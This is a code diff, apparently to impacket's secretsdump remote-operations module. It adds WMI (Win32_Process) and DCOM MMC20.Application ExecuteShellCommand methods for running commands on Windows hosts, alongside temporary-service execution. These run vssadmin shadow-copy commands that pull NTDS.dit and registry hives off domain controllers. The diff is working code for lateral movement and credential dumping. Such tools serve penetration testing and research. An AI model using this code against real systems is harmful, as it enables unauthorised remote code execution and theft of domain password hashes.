@@ -61,7 +61,14 @@ from impacket import winregistry, ntlm
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.dcerpc.v5.dcom import wmi
+from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
+    VARIANT, VARENUM, DISPATCH_METHOD
+from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
+    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
+    IRemUnknown2, INTERFACE
 from impacket.ese import ESENT_DB
+from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
 from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.structure import Structure
 from impacket.winregistry import hexdump
@@ -231,7 +238,23 @@ class RemoteFile:
         self.__currentOffset = 0
 
     def open(self):
-        self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName)
+        tries = 0
+        while True:
+            try:
+                self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName, desiredAccess=FILE_READ_DATA,
+                                                   shareMode=FILE_SHARE_READ)
+            except Exception, e:
+                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
+                    if tries >= 3:
+                        raise e
+                    # Stuff didn't finish yet.. wait more
+                    time.sleep(5)
+                    tries += 1
+                    pass
+                else:
+                    raise e
+            else:
+                break
 
     def seek(self, offset, whence):
         # Implement whence, for now it's always from the beginning of the file
@@ -294,6 +317,11 @@ class RemoteOperations:
         self.__shell = '%COMSPEC% /Q /c '
         self.__output = '%SYSTEMROOT%\\Temp\\__output'
         self.__answerTMP = ''
+
+        self.__execMethod = 'smbexec'
+
+    def setExecMethod(self, method):
+        self.__execMethod = method
 
     def __connectSvcCtl(self):
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
@@ -683,23 +711,140 @@ class RemoteOperations:
         LOG.debug('Saving remote SECURITY database')
         return self.__retrieveHive('SECURITY')
 
+    def __smbExec(self, command):
+        self.__serviceDeleted = False
+        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName,
+                                     lpBinaryPathName=command)
+        service = resp['lpServiceHandle']
+        try:
+            scmr.hRStartServiceW(self.__scmr, service)
+        except:
+            pass
+        scmr.hRDeleteService(self.__scmr, service)
+        self.__serviceDeleted = True
+        scmr.hRCloseServiceHandle(self.__scmr, service)
+
+    def __getInterface(self, interface, resp):
+        # Now let's parse the answer and build an Interface instance
+        objRefType = OBJREF(''.join(resp))['flags']
+        objRef = None
+        if objRefType == FLAGS_OBJREF_CUSTOM:
+            objRef = OBJREF_CUSTOM(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_HANDLER:
+            objRef = OBJREF_HANDLER(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_STANDARD:
+            objRef = OBJREF_STANDARD(''.join(resp))
+        elif objRefType == FLAGS_OBJREF_EXTENDED:
+            objRef = OBJREF_EXTENDED(''.join(resp))
+        else:
+            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)
+
+        return IRemUnknown2(
+            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
+                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
+                      target=interface.get_target()))
+
+    def __mmcExec(self,command):
+        command = command.replace('%COMSPEC%', 'c:\\windows\\system32\\cmd.exe')
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
+        iMMC = IDispatch(iInterface)
+
+        resp = iMMC.GetIDsOfNames(('Document',))
+
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgvarg'] = NULL
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 0
+        dispParams['cNamedArgs'] = 0
+        resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+        iDocument = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+        resp = iDocument.GetIDsOfNames(('ActiveView',))
+        resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+        iActiveView = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+        pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
+
+        pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 4
+        dispParams['cNamedArgs'] = 0
+        arg0 = VARIANT(None, False)
+        arg0['clSize'] = 5
+        arg0['vt'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['bstrVal']['asData'] = 'c:\\windows\\system32\\cmd.exe'
+
+        arg1 = VARIANT(None, False)
+        arg1['clSize'] = 5
+        arg1['vt'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['bstrVal']['asData'] = 'c:\\'
+
+        arg2 = VARIANT(None, False)
+        arg2['clSize'] = 5
+        arg2['vt'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['bstrVal']['asData'] = command[len('c:\\windows\\system32\\cmd.exe'):]
+
+        arg3 = VARIANT(None, False)
+        arg3['clSize'] = 5
+        arg3['vt'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['bstrVal']['asData'] = '7'
+        dispParams['rgvarg'].append(arg3)
+        dispParams['rgvarg'].append(arg2)
+        dispParams['rgvarg'].append(arg1)
+        dispParams['rgvarg'].append(arg0)
+
+        iActiveView.Invoke(pExecuteShellCommand, 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgvarg'] = NULL
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 0
+        dispParams['cNamedArgs'] = 0
+
+        iMMC.Invoke(pQuit, 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+
+
+    def __wmiExec(self, command):
+        # Convert command to wmi exec friendly format
+        command = command.replace('%COMSPEC%', 'cmd.exe')
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        win32Process,_ = iWbemServices.GetObject('Win32_Process')
+        win32Process.Create(command, '\\', None)
+
+        dcom.disconnect()
+
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
                   self.__shell + self.__batchFile
         command += ' & ' + 'del ' + self.__batchFile
 
-        self.__serviceDeleted = False
-        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName,
-                                     lpBinaryPathName=command)
-        service = resp['lpServiceHandle']
-        try:
-           scmr.hRStartServiceW(self.__scmr, service)
-        except:
-           pass
-        scmr.hRDeleteService(self.__scmr, service)
-        self.__serviceDeleted = True
-        scmr.hRCloseServiceHandle(self.__scmr, service)
+        LOG.debug('ExecuteRemote command: %s' % command)
+        if self.__execMethod == 'smbexec':
+            self.__smbExec(command)
+        elif self.__execMethod == 'wmiexec':
+            self.__wmiExec(command)
+        elif self.__execMethod == 'mmcexec':
+            self.__mmcExec(command)
+        else:
+            raise Exception('Invalid exec method %s, aborting' % self.__execMethod)
+
 
     def __answer(self, data):
         self.__answerTMP += data
@@ -767,6 +912,7 @@ class RemoteOperations:
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
         LOG.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
+        LOG.info('Using %s method for remote execution' % self.__execMethod)
         # Get the list of remote shadows
         shadow, shadowFor = self.__getLastVSS()
         if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
@@ -787,7 +933,20 @@ class RemoteOperations:
         if shouldRemove is True:
             self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
 
-        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+        tries = 0
+        while True:
+            try:
+                self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                break
+            except Exception, e:
+                if tries >= 3:
+                    raise e
+                if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0 or str(e).find('STATUS_SHARING_VIOLATION') >=0:
+                    tries += 1
+                    time.sleep(5)
+                    pass
+                else:
+                    logging.error('Cannot delete target file \\\\%s\\ADMIN$\\Temp\\__output: %s' % (self.__smbConnection.getRemoteHost(), str(e)))
 
         remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
 
